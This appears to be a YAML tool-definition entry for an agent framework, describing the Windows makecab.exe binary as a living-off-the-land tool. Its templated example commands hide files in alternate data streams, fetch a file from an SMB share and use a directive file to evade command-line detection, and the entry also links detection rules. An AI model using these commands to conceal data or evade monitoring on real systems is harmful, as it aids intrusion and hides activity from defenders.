---
id: windows-ads-makecab
namespace: windows:ads:makecab
name: makecab
description: 'Binary to package existing files into a cabinet (.cab) file Located at: C:\Windows\System32\makecab.exe; C:\Windows\SysWOW64\makecab.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- system.file.alternate-data-stream
- network.transfer.download
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - process_spawn
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- makecab
parameters: []
features: []
execution:
  template: makecab
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file. (Hide data compressed into an alternate data stream)
  command: makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
- description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file. (Hide data compressed into an alternate data stream)
  command: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
- description: Download and compresses the target file and stores it in the target file. (Download file and compress into a cab file)
  command: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
- description: Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification. (Bypass command-line based detections)
  command: makecab /F {PATH:.ddf}
references:
- label: cdd2d0d0ec9abb686f0e89306e277b8f
  url: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
- label: makecab-directives.html
  url: https://ss64.com/nt/makecab-directives.html
- label: 0789728583.pdf
  url: https://www.pearsonhighered.com/assets/samplechapter/0/7/8/9/0789728583.pdf
- label: bb417343(v=msdn.10)#makecab-application
  url: https://learn.microsoft.com/en-us/previous-versions/bb417343(v=msdn.10)#makecab-application
techniques:
- defense-evasion
- exfiltration
- execution
mitre_ids:
- T1564.004
- T1105
- T1036
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
- type: ioc
  description: Makecab retrieving files from Internet
- type: ioc
  description: Makecab storing data into alternate data streams
install:
- method: choco
  package_name: makecab
  commands:
  - choco install makecab
---


# makecab

makecab is a Windows LOLBin. Binary to package existing files into a cabinet (.cab) file Located at: C:\Windows\System32\makecab.exe; C:\Windows\SysWOW64\makecab.exe.
